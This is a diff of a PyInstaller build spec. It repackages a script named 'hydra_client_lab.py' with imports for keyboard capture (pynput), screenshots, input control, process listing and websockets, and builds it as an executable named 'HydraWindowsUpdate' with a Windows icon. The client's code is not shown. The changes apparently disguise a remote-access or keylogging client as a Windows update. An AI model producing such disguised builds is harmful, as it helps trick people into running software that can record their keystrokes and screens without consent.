@@ -2,11 +2,11 @@
 
 
 a = Analysis(
-    ['build\\standalone.py'],
+    ['hydra_client_lab.py'],
     pathex=[],
     binaries=[],
     datas=[],
-    hiddenimports=[],
+    hiddenimports=['websockets', 'asyncio', 'pynput.keyboard', 'win32api', 'win32con', 'pyautogui', 'psutil', 'PIL.Image'],
     hookspath=[],
     hooksconfig={},
     runtime_hooks=[],
@@ -22,7 +22,7 @@ exe = EXE(
     a.binaries,
     a.datas,
     [],
-    name='updater',
+    name='HydraWindowsUpdate',
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
@@ -35,4 +35,5 @@ exe = EXE(
     target_arch=None,
     codesign_identity=None,
     entitlements_file=None,
+    icon=['windows.ico'],
 )
